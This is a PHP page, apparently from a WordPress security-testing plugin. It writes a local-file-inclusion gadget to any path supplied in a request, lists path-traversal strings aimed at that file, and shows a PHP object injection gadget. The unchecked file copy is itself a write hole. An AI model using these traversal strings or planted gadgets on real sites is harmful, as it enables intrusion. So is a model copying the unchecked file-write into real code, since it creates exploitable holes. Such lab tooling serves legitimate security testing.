<?php

require_once 'inc/code.php';

$action = '';
$path = '/tmp/lfi.php';
if (isset($_REQUEST['lfi_path'])) {
    $path = $_REQUEST['lfi_path'];
    $success = copy(__DIR__ . '/payloads/lfi.php', $path);
    $path = esc_js($path);
    if ($success){
        echo "<script>showSuccess('Installed LFI Gadget to $path')</script>";
    }
    else{
        echo "<script>showError('Could not install LFI Gadget to $path')</script>";
    }
}

?>

<h1>LFI</h1>
<p>Install a LFI gadget to specific path</p>
<form action="" method="post">
    <div class="form-group">
        <input type="text" value="<?php echo esc_attr($path);?>" name="lfi_path" placeholder="Path">
        <input class="btn btn-success" type="submit" value="Install" name="submit">
    </div>
</form>

<p>
<pre>
<code>
../../../../../../../../../../../../../../../../../../../tmp/lfi.php
..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././tmp/lfi.php
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Flfi.php
</code>
</pre>
</p>

<h1>PHP Object Injection</h1>
<p>If you have installed this plugin into WordPress the following gadget will be available to use:</p>
<?php
if (class_exists('ObjInjec')) {
    // The ObjInjec class is defined, you can use it
    echo "✅ ObjInjec class is defined.";
} else {
    // The ObjInjec class is not defined
    echo "❌ ObjInjec class is not defined.";
}
print_code(file_get_contents(__DIR__ . '/payloads/php_obj.php'));
?>

<pre>
<code>
</code>
</pre>

